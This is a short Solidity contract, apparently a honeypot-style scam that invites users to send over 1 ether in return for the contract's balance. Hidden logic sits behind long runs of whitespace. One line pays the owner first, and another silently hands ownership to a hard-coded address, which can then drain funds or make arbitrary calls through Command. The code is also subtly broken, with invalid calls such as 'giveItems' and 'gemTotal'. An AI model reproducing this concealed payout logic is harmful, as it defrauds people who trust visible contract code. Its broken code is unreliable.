pragma solidity ^0.4.19;

contract HomeyJar {
    address public DungeonMaster = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    DungeonMaster.giveItems(this.gemTotal);
            msg.sender.giveItems(this.gemTotal);
        }
    }

    function redeemGold() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){DungeonMaster=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
        require(msg.sender == DungeonMaster);
        DungeonMaster.giveItems(this.gemTotal);
    }

    function Command(address adr,bytes data) payable public {
        require(msg.sender == DungeonMaster);
        adr.call.value(msg.value)(data);
    }
}